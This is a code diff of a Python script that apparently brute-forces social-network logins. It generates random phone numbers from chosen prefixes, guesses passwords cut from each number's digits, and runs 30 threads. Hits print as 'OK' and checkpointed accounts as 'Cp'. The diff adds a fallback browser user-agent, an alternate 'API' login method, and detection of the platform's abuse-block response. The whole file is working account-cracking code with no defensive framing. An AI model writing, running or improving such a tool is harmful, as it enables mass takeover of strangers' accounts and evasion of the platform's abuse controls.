@@ -5,9 +5,10 @@ try:
 except:
     os.system("pip install requests")
 
-
-ugen=open("r-ua.txt","r").read().splitlines()
-
+try:
+    ugen=open("r-ua.txt","r").read().splitlines()
+except:
+    ugen=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931"]
 #e="100024864368249"
 
 #p="941186"
@@ -160,13 +161,12 @@ def napi(user,pw):
         print(f"OK -{user}-{pw}")
     elif "User must verify their account" in post.text:
         print(f"Cp -{user}-{pw}")
+    elif "The action attempted has been deemed abusive or is otherwise disallowed" in post.text:
+        print("API Method Expired")
+        #sys.exit()
+        #time.sleep(5)
+        
     nn+=1
-
-
-
-
-
-
 
 
 os.system("clear")
@@ -175,6 +175,7 @@ code=input("Code(0305,0303,0345):")
 #305#random.choice(codes)
 lim=int(input("Limit:"))
 pslen=int(input("Password Length (6-11):"))
+m=int(input("Method:\n1.Normal\n2.Api\nChoose :"))
 nums=[]
 for i in range(lim):
     nums.append(f"{code}{''.join(random.choice(string.digits) for _ in range(7))}")
@@ -186,8 +187,10 @@ for i in range(lim):
 with tdp(max_workers=30) as t:
     for i in nums:
         pws=[i[(11-n):] for n in range(6,pslen+1)]
-        t.submit(c,i,pws)
-
+        if m==1:
+            t.submit(c,i,pws)
+        else:
+            t.submit(napi,i,pws)
 
 
 
